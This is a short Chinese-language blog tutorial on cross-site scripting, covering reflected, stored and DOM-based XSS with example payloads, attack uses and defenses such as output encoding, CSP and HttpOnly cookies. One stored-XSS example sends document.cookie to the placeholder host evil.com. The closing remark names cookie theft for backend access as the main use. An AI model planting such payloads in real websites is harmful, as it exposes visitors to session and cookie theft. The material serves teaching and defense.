---
title: XSS详解
toc: true
categories:
  - web
date: 2024-05-06 21:00:00
tags:
  - xss
---

本篇研究 XSS（Cross-Site Scripting，跨站脚本攻击）

作用：攻击者在网站注入恶意脚本，**在用户浏览网页时执行该脚本**，从而实现盗取 Cookie、钓鱼、传播木马等攻击行为。

## 一、XSS 原理

XSS 是客户端攻击，核心是将恶意脚本注入到网页中，诱使其他用户在自己的浏览器中执行。

常见注入点包括：

- 评论区、昵称、文章内容等可存储内容；
- URL 参数、搜索框、表单等用户可控输入；

攻击者通过这些点注入 JavaScript 代码，实现对用户的攻击。

## 二、XSS 类型

| 类型       | 描述                                                |
| ---------- | --------------------------------------------------- |
| 反射型 XSS | 恶意脚本来自当前请求，如URL参数，页面立即反射执行   |
| 存储型 XSS | 恶意脚本被存储在数据库中，后续所有访问者都会被攻击  |
| DOM 型 XSS | 恶意代码通过修改前端 DOM 实现，通常不依赖服务端返回 |

---

### 1. 反射型 XSS 示例：

用户访问如下 URL：

```
https://vuln.com/search?q=<script>alert(1)</script>
```


后端返回：

你搜索了：`<script>alert(1)</script>`

浏览器解析执行脚本，弹出 alert(1)。
### 2. 存储型 XSS 示例：

攻击者在评论区插入：

```
<script>fetch('http://evil.com?c='+document.cookie)</script>
```

其他用户访问页面时会被执行，造成 Cookie 被窃取。
### 3. DOM 型 XSS 示例：

假设前端代码如下：

```javascript
let query = location.hash.substring(1);
document.body.innerHTML = "搜索：" + query;
```

用户访问：

```
https://site.com/#<img src=x onerror=alert(1)>
```

脚本被插入到页面并执行。

## 三、XSS 攻击利用

XSS 可实现：

- 窃取 Cookie 或 localStorage
- 劫持用户会话
- 引诱用户点击恶意链接（钓鱼）
- 网页仿冒（页面篡改）
- 与 CSRF 联合攻击

------

## 四、XSS 防御措施

| 防御手段         | 描述                                                 |
| ---------------- | ---------------------------------------------------- |
| 输出编码（重点） | 对用户输出做 HTML/JS/CSS 编码，防止执行脚本          |
| 使用 CSP 策略    | 内容安全策略限制脚本来源，防止外部脚本执行           |
| 输入校验与过滤   | 防止含有 `<script>`、`onerror`、`javascript:` 等内容 |
| HttpOnly Cookie  | 设置 Cookie 为 HttpOnly，防止被 JS 读取              |

感觉有用的就是存储型 XSS，其他两个比较鸡肋，作用比较大的就是窃取 Cookie 或 localStorage来进后台吧